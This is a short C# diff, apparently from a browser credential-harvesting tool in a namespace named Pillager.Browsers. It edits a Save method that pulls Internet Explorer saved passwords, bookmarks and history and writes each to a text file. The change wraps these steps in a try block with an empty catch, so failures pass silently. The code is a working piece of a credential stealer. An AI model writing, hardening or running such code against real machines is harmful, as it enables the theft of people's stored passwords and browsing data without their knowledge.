@@ -281,14 +281,18 @@ namespace Pillager.Browsers
 
         public static void Save(string path)
         {
-            string savepath = Path.Combine(path, BrowserName);
-            Directory.CreateDirectory(savepath);
-            string passwords = IE_passwords();
-            string books = IE_books();
-            string history = IE_history();
-            if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
-            if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
-            if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
+            try
+            {
+                string savepath = Path.Combine(path, BrowserName);
+                Directory.CreateDirectory(savepath);
+                string passwords = IE_passwords();
+                string books = IE_books();
+                string history = IE_history();
+                if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
+                if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
+                if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
+            }
+            catch { }
         }
     }
 }
